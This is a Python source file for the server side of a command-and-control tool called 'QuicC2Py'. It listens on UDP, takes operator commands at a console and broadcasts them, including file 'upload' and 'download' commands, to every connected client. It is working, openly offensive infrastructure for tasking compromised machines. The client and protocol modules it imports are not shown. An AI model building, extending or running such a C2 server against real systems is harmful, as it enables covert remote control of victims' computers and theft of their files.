import asyncio
from config import Config
from protocol import UDPC2Protocol
from commands import CommandHandler

async def main():
    config = Config()
    command_handler = CommandHandler()
    print(f"[Server] QuicC2Py is running on {config.server_host}:{config.server_port}...")

    loop = asyncio.get_running_loop()
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: UDPC2Protocol(config, is_server=True),
        local_addr=(config.server_host, config.server_port),
    )

    async def handle_commands():
        while True:
            command = await asyncio.get_event_loop().run_in_executor(None, input, "[Server] Enter command (type 'help' for list, 'exit' to quit): ")
            command = command.strip().lower()
            if command == "help":
                print("[Server] Available commands:\n" + command_handler.list_commands())
            elif command == "exit":
                print("[Server] Shutting down...")
                transport.close()
                break
            elif command in command_handler.commands or command.startswith(("upload ", "download ")):
                for addr in protocol.clients:
                    protocol.send_message(command, addr)
            else:
                print(f"[Server] Unknown command: {command}. Type 'help' for available commands.")

    asyncio.create_task(handle_commands())
    try:
        await asyncio.Future()
    finally:
        transport.close()

if __name__ == "__main__":
    asyncio.run(main())